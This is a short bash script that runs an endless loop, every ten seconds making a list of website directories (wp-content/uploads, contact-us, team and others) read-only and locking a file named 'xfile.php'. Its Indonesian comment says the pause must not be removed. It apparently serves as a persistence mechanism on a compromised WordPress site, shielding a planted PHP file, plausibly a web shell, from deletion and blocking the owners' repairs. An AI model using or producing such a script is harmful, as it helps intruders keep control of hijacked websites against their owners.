#!/bin/bash

TARGETS=(
  "membership"
  "employment"
  "team"
  "research-fellow"
  "contact-us"
  "3d-flip-book"
  "safe-ar-last-3-years"
  "wp-content/uploads"
)

XFILE="xfile.php"

while true; do
  for dir in "${TARGETS[@]}"; do
    if [ -d "$dir" ]; then
      chmod -R 555 "$dir" 2>/dev/null
    fi
  done

  if [ -f "$XFILE" ]; then
    chmod 444 "$XFILE" 2>/dev/null
  fi

  # jeda WAJIB (jangan dihapus)
  sleep 10
done